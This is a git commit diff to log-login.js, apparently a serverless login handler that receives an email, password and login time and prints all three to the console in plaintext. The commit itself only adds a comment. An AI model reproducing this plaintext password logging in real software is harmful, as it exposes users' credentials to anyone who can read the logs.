58e225b6deaaafb10361fe2fb6f13009590cf95a
XDE-dev <78691771+XDE-dev@users.noreply.github.com>
2024-12-06 02:09:29 +0800

    Update log-login.js

--- log-login.js
+++ log-login.js
@@ -1,6 +1,8 @@
 export default async (req, res) => {
   if (req.method === 'POST') {
     const { email, password, loginTime } = req.body;
+    
+    // Logging data to the console
     console.log(`Email: ${email}, Password: ${password}, Login Time: ${loginTime}`);
 
     res.status(200).json({ status: 'success' });
